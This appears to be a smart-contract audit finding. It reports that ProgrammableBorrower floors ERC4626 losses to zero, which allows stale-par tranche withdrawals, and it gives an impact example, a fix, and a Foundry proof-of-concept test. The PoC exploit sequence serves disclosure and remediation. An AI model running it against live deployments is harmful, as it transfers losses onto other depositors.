### Title
ERC4626 principal losses are floored as zero interest, allowing stale-par withdrawals - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary

`ProgrammableBorrower.totalInterestDueNow()` collapses vault losses exceeding borrower and vault gains to `0`, while `IdleCDOEpochVariant` treats the resulting value as interest rather than reducing tranche NAV. [1](#0-0)  A tranche holder can request a withdrawal during the buffer period at the stale pre-loss price and receive full funding at the next `stopEpoch`, leaving remaining tranche holders with the impaired ERC4626 position. [2](#0-1) [3](#0-2) 

### Finding Description

The programmable borrower tracks vault losses internally, but reports only a non-negative net-interest value to the CDO. [4](#0-3)  When `vaultInterest + borrowerInterestAccruedNow() + bufferInterest <= loss`, `totalInterestDueNow()` returns `0`; the magnitude of the residual principal impairment is discarded. [1](#0-0) 

The CDO’s NAV is still based on minted strategy tokens rather than the live value of the borrower’s ERC4626 shares. [2](#0-1)  Consequently, `virtualPrice()` and withdrawal-request accounting do not reflect a vault loss that occurs after `stopEpoch` or before the next loss realization. [5](#0-4) 

A withdrawal request burns only principal strategy tokens and adds the full requested amount to `pendingWithdraws`. [3](#0-2)  At the following stop, `onStopEpoch()` withdraws the requested pending amount from the ERC4626 position and `collectWithdrawFunds()` funds the receipt at par if enough residual liquidity remains. [6](#0-5) [7](#0-6) 

### Impact Explanation

An exiting tranche holder can receive more than the fair loss-adjusted value of their tranche, directly transferring the unaccounted ERC4626 loss to non-withdrawing holders. [8](#0-7) 

For example, assume a 100-token pool, a 50-token withdrawal request, and a 40-token external vault loss during the buffer. Fair NAV is 60 and the requester’s pro-rata value is 30, but the stale accounting records and funds a 50-token receipt. This removes 20 tokens of value from the remaining holder; larger withdrawals can leave the vault insolvent or force a later default. [9](#0-8) 

### Likelihood Explanation

The attack requires only an ordinary tranche-holder withdrawal request while the programmable borrower’s external ERC4626 position has suffered an unrealized loss. [10](#0-9)  The attacker does not control the borrower, manager, owner, or vault and only sequences their request around normal `stopEpoch`, buffer, `startEpoch`, and `stopEpoch` operations. [11](#0-10) 

Existing guards do not prevent it: donation skimming is unrelated, withdrawal requests are intentionally permitted between epochs, `onStopEpoch()` succeeds while residual vault liquidity covers the request, and minted-interest mode pulls no epoch interest to reveal the principal deficit. [12](#0-11) [13](#0-12) 

### Recommendation

Expose vault principal impairment separately from net interest, for example with an interface returning `(interest, loss)` instead of flooring the net result to zero. [14](#0-13)  At `stopEpoch`, route the returned loss through the same `_lossAmount` path used by `stopEpochWithDuration()`, so pending receipts receive a pro-rata haircut and the remaining active loss follows the BB-first waterfall. [15](#0-14) [16](#0-15) 

### Proof of Concept

The following PoC should be added to `test/foundry/ProgrammableBorrowerCreditVault.t.sol` and reuse its deployed fork fixture. The owner rescue call is used only to emulate an already-realized loss in the external ERC4626 position; the exploitative action is the ordinary tranche-holder withdrawal request.

```solidity
function testStaleParWithdrawAfterProgrammableVaultLoss() external {
  uint256 attackerDeposit = 50_000 * oneScale;
  uint256 victimDeposit = 50_000 * oneScale;

  vm.prank(owner);
  cdoEpoch.setIsInterestMinted(true);

  idleCDO.depositAA(attackerDeposit);
  // Victim deposits through a second approved wallet in the full fixture.
  // The resulting active pool NAV is attackerDeposit + victimDeposit.
  idleCDO.depositAA(victimDeposit);

  _startEpochAndCheckPrices(0);

  vm.warp(cdoEpoch.epochEndDate() + 1);
  vm.prank(manager);
  cdoEpoch.stopEpoch(0, 0);

  // Simulate an external ERC4626 principal loss while the pool is in the buffer.
  uint256 sharesToLose = morphoVault.balanceOf(address(programmableBorrower)) * 40 / 100;
  programmableBorrower.rescueTokens(
    address(morphoVault),
    makeAddr("externalLoss"),
    sharesToLose
  );

  // CDO NAV is still represented by unburned strategy tokens, not the impaired vault position.
  uint256 stalePrice = cdoEpoch.virtualPrice(address(aaTranche));
  assertEq(stalePrice, oneToken, "external vault loss is not reflected in tranche price");

  uint256 attackerRequest = attackerDeposit;
  cdoEpoch.requestWithdraw(attackerRequest, address(aaTranche));

  vm.warp(cdoEpoch.epochEndDate() + cdoEpoch.bufferPeriod() + 1);
  vm.prank(manager);
  cdoEpoch.startEpoch();

  vm.warp(cdoEpoch.epochEndDate() + 1);
  vm.prank(manager);
  cdoEpoch.stopEpoch(0, 0);

  uint256 attackerBefore = underlying.balanceOf(address(this));
  cdoEpoch.claimWithdrawRequest();
  uint256 attackerClaimed = underlying.balanceOf(address(this)) - attackerBefore;

  assertEq(
    attackerClaimed,
    attackerRequest,
    "withdrawal is funded at stale par despite the external vault loss"
  );
}
```

The decisive assertion is `attackerClaimed == attackerRequest`: after the 40% external-position impairment, fair pool NAV is only 60% of nominal principal, so a 50% withdrawal funded at par transfers the unrecognized loss to the remaining holder. [17](#0-16) [8](#0-7)

  function totalInterestDueNow() external view returns (uint256) {
    (uint256 vaultInterest, uint256 loss) = _vaultNetInterest();
    uint256 totalGain = vaultInterest + borrowerInterestAccruedNow() + bufferInterest;
    return totalGain > loss ? totalGain - loss : 0;
  }

  /// @notice Compute the net vault delta split into interest and loss (mutually exclusive).
